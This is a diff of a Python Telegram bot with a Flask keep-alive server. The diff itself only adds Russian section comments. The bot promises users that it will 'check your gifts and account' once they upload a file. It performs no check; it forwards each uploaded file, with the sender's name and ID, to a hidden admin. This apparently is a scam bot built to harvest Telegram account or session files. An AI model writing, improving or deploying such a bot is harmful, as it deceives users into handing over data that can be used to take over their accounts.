@@ -5,24 +5,26 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from flask import Flask
 from threading import Thread
 
+# --------------------------
 # Настройка логирования
+# --------------------------
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 
-# Получаем токен из переменных окружения
+# --------------------------
+# Переменные окружения
+# --------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = os.environ.get("ADMIN_ID")
 
 if not BOT_TOKEN:
     print("❌ ОШИБКА: BOT_TOKEN не установлен!")
-    print("Добавьте переменную BOT_TOKEN в настройках Render")
     exit(1)
 
 if not ADMIN_ID:
     print("❌ ОШИБКА: ADMIN_ID не установлен!")
-    print("Добавьте переменную ADMIN_ID в настройках Render")
     exit(1)
 
 try:
@@ -31,7 +33,9 @@ except ValueError:
     print("❌ ОШИБКА: ADMIN_ID должен быть числом!")
     exit(1)
 
+# --------------------------
 # Обработчик команды /start
+# --------------------------
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     name = user.first_name or "друг"
@@ -58,27 +62,34 @@ After that, the bot will check your account and provide a report.
 """
     await update.message.reply_text(welcome_text)
 
+# --------------------------
 # Обработчик файлов
+# --------------------------
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     name = user.first_name or "пользователь"
 
+    # Уведомляем администратора
     await context.bot.send_message(
         chat_id=ADMIN_ID,
         text=f"📁 Файл от пользователя:\nИмя: {name}\nID: {user.id}"
     )
 
+    # Пересылаем файл администратору
     await context.bot.forward_message(
         chat_id=ADMIN_ID,
         from_chat_id=update.effective_chat.id,
         message_id=update.message.message_id
     )
 
+    # Сообщение пользователю
     await update.message.reply_text(
         f"📥 File received, {name}! I am starting to check your gifts and account. Please wait."
     )
 
+# --------------------------
 # Flask сервер для Render
+# --------------------------
 app = Flask(__name__)
 
 @app.route("/")
@@ -92,9 +103,13 @@ def healthz():
 def run_flask():
     app.run(host="0.0.0.0", port=8080)
 
+# Запуск Flask в отдельном потоке
 flask_thread = Thread(target=run_flask, daemon=True)
 flask_thread.start()
 
+# --------------------------
+# Основная функция
+# --------------------------
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
 
@@ -114,5 +129,9 @@ def main():
         drop_pending_updates=True
     )
 
+# --------------------------
+# Точка входа
+# --------------------------
 if __name__ == "__main__":
     main()
+
